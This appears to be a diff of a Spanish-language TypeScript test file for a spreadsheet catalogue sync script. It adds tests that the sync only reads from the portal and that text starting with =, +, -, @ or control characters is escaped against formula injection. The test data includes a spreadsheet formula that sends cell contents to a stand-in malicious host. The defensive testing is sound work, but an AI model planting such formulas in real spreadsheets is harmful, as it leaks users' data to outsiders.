@@ -36,7 +36,14 @@ function crearHoja(inicial: Record<string, unknown> = {}) {
   const rango = (f: number, c: number, nf = 1, nc = 1) => ({
     getValues: () => Array.from({ length: nf }, (_, i) => Array.from({ length: nc }, (_, j) => valores.get(clave(f + i, c + j)) ?? "")),
     getFormulas: () => Array.from({ length: nf }, (_, i) => Array.from({ length: nc }, (_, j) => formulas.get(clave(f + i, c + j)) ?? "")),
-    setValues: (m: unknown[][]) => m.forEach((fila, i) => fila.forEach((v, j) => { valores.set(clave(f + i, c + j), v); formulas.delete(clave(f + i, c + j)); })),
+    // Como Sheets: un texto con "=" adelante pasa a ser una FÓRMULA, salvo que lleve el apóstrofe de
+    // "forzar texto", que se guarda sin el apóstrofe.
+    setValues: (m: unknown[][]) => m.forEach((fila, i) => fila.forEach((v, j) => {
+      const k = clave(f + i, c + j);
+      if (typeof v === "string" && v.startsWith("'")) { valores.set(k, v.slice(1)); formulas.delete(k); }
+      else if (typeof v === "string" && v.startsWith("=")) { formulas.set(k, v); valores.delete(k); }
+      else { valores.set(k, v); formulas.delete(k); }
+    })),
     setValue: (v: unknown) => { valores.set(clave(f, c), v); formulas.delete(clave(f, c)); },
     setFormula: (fx: string) => { formulas.set(clave(f, c), fx); valores.delete(clave(f, c)); },
     clearContent: () => { for (let i = 0; i < nf; i++) for (let j = 0; j < nc; j++) { valores.delete(clave(f + i, c + j)); formulas.delete(clave(f + i, c + j)); } },
@@ -82,7 +89,7 @@ function crearHoja(inicial: Record<string, unknown> = {}) {
 
 function cargarScript(opciones: { hojas: Record<string, Hoja>; respuesta: { codigo: number; cuerpo: unknown }; props?: Record<string, string> }) {
   const props: Record<string, string> = { URL: "https://ejemplo.test/api/sheets/catalogo", TOKEN: "t", ...opciones.props };
-  const pedidos: { url: string; headers: Record<string, string> }[] = [];
+  const pedidos: { url: string; headers: Record<string, string>; opciones: Record<string, unknown> }[] = [];
   const entorno = {
     SpreadsheetApp: { getActive: () => ({ getSheetByName: (n: string) => opciones.hojas[n] ?? null, insertSheet: (n: string) => (opciones.hojas[n] = crearHoja()) }), flush: () => undefined, CopyPasteType: { PASTE_FORMAT: "FORMAT", PASTE_FORMULA: "FORMULA" } },
     PropertiesService: {
@@ -95,14 +102,14 @@ function cargarScript(opciones: { hojas: Record<string, Hoja>; respuesta: { codi
     LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock: () => undefined }) },
     UrlFetchApp: {
       fetch: (url: string, o: { headers: Record<string, string> }) => {
-        pedidos.push({ url, headers: o.headers });
+        pedidos.push({ url, headers: o.headers, opciones: o as unknown as Record<string, unknown> });
         return { getResponseCode: () => opciones.respuesta.codigo, getContentText: () => JSON.stringify(opciones.respuesta.cuerpo) };
       },
     },
   };
   const fabrica = new Function(
     "module", "SpreadsheetApp", "PropertiesService", "LockService", "UrlFetchApp",
-    `${FUENTE}\nreturn { sincronizar_, etiquetaDePiscina, claveDePrecio, valorDePrecio, validarDatos, valorDeStock, buscarEncabezadoStock };`
+    `${FUENTE}\nreturn { sincronizar_, etiquetaDePiscina, claveDePrecio, valorDePrecio, validarDatos, valorDeStock, buscarEncabezadoStock, celdaParaEscribir_ };`
   );
   const api = fabrica({}, entorno.SpreadsheetApp, entorno.PropertiesService, entorno.LockService, entorno.UrlFetchApp);
   return { ...api, props, pedidos };
@@ -190,6 +197,18 @@ describe("validarDatos", () => {
 });
 
 describe("sincronizar_", () => {
+  it("sólo LEE del portal: un GET sin cuerpo, nunca manda datos (la planilla no puede cambiar nada, stock incluido)", () => {
+    const s = cargarScript({ hojas: hojasBase(), respuesta: { codigo: 200, cuerpo: { ...DATOS, stock: { "piscinas:indusplast_caribe_550": 3 } } } });
+
+    s.sincronizar_(true);
+
+    expect(s.pedidos).toHaveLength(1);
+    const { opciones } = s.pedidos[0];
+    expect(opciones.method ?? "get").toMatch(/^get$/i);
+    expect(opciones).not.toHaveProperty("payload");
+    expect(opciones).not.toHaveProperty("contentType");
+  });
+
   it("manda el token en el encabezado y reemplaza proveedores y artículos", () => {
     const hojas = hojasBase();
     const s = cargarScript({ hojas, respuesta: { codigo: 200, cuerpo: DATOS } });
@@ -376,7 +395,7 @@ describe("buscarEncabezadoStock · encabezados con otro texto", () => {
 describe("hoja 'Catálogo web' (todos los campos de los precios de venta)", () => {
   const FILAS = [
     ["Piscinas", "indusplast_caribe_550", "Piscina de fibra Caribe 550", "Piscinas", "obra", 8810000, 3, "Activo", "05/10/2026"],
-    ["Cercos", "precioCon", "Precio por metro lineal con instalación", "Cercos", "ml", "A cotizar", "", "De baja", "01/10/2026"],
+    ["Cercos", "precioCon", "Precio por metro lineal con instalación", "Cercos", "ml", "A cotizar", "", "Desactivado", "01/10/2026"],
   ];
   const conCatalogo = { ...DATOS, catalogo: FILAS };
 
@@ -392,7 +411,7 @@ describe("hoja 'Catálogo web' (todos los campos de los precios de venta)", () =
     expect(h.v(2, 6)).toBe(8810000);
     expect(h.v(2, 7)).toBe(3);
     expect(h.v(3, 6)).toBe("A cotizar");
-    expect(h.v(3, 8)).toBe("De baja");
+    expect(h.v(3, 8)).toBe("Desactivado");
     expect(r).toMatchObject({ catalogo: 2 });
   });
 
@@ -433,6 +452,49 @@ describe("proveedores nuevos o con datos nuevos llegan a la hoja Proveedores", (
     expect(hojas.Proveedores.v(6, 4)).toBe("+54 9 3534 111111");
     expect(hojas.Proveedores.v(7, 1)).toBe("Proveedor Nuevo");
     expect(hojas.Proveedores.v(7, 4)).toBe("+54 9 3534 222222");
+  });
+});
+
+describe("textos que parecen fórmulas (inyección de fórmulas desde el catálogo web)", () => {
+  const { celdaParaEscribir_ } = cargarScript({ hojas: {}, respuesta: { codigo: 200, cuerpo: {} } });
+
+  it.each([
+    ['=IMPORTDATA("https://sitio-malo.com/?d="&A1)', "igual"],
+    ["=1+1", "igual"],
+    ["+54 9 3534 111111", "más"],
+    ["-5 bolsas", "menos"],
+    ["@SUM(A1:A2)", "arroba"],
+    ["\t=1+1", "tabulador"],
+    ["\r=1+1", "retorno de carro"],
+  ])("le pone el apóstrofe a %s (%s)", (texto) => {
+    expect(celdaParaEscribir_(texto)).toBe(`'${texto}`);
+  });
+
+  it("no toca los números, los textos comunes, ni lo vacío", () => {
+    expect(celdaParaEscribir_(6461)).toBe(6461);
+    expect(celdaParaEscribir_(-5)).toBe(-5);
+    expect(celdaParaEscribir_(0)).toBe(0);
+    expect(celdaParaEscribir_("Cemento")).toBe("Cemento");
+    expect(celdaParaEscribir_("Cemento = 50 kg")).toBe("Cemento = 50 kg");
+    expect(celdaParaEscribir_(null)).toBe("");
+    expect(celdaParaEscribir_(undefined)).toBe("");
+  });
+
+  it("al sincronizar, un nombre de material con '=' queda como TEXTO y no como fórmula", () => {
+    const hojas = hojasBase() as Record<string, Hoja>;
+    const malo = '=IMPORTDATA("https://sitio-malo.com/?d="&B3)';
+    const cuerpo = {
+      ...DATOS,
+      proveedores: [[malo, "Corralón", "Juan", "+54 9 3534 111111", "", "", "nota"]],
+      articulos: [{ usd: false, fila: fila(malo, 6461) }],
+    };
+    cargarScript({ hojas, respuesta: { codigo: 200, cuerpo } }).sincronizar_(true);
+
+    expect(hojas.Proveedores.v(6, 1)).toBe(malo);
+    expect(hojas.Proveedores.formulas.get("6,1")).toBeUndefined();
+    expect(hojas.Proveedores.v(6, 4)).toBe("+54 9 3534 111111");
+    expect(hojas["Artículos"].v(6, 1)).toBe(malo);
+    expect(hojas["Artículos"].formulas.get("6,1")).toBeUndefined();
   });
 });
 
@@ -607,7 +669,7 @@ describe("piscinas nuevas: se agregan a 'Precios y margen' en su lugar", () => {
     const hoja = hojaPrecios();
     const hojas = { ...hojasBase(), "Precios y margen": hoja } as Record<string, Hoja>;
     const catalogo = [
-      ["Piscinas", "lista_hormigon_8x4_5", "x", "Piscinas", "obra", 1, "", "De baja", ""],
+      ["Piscinas", "lista_hormigon_8x4_5", "x", "Piscinas", "obra", 1, "", "Desactivado", ""],
       ["Cercos", "precioCon", "x", "Cercos", "ml", 1, "", "Activo", ""],
     ];
     const r = cargarScript({ hojas, respuesta: { codigo: 200, cuerpo: { ...DATOS, catalogo } } }).sincronizar_(true);
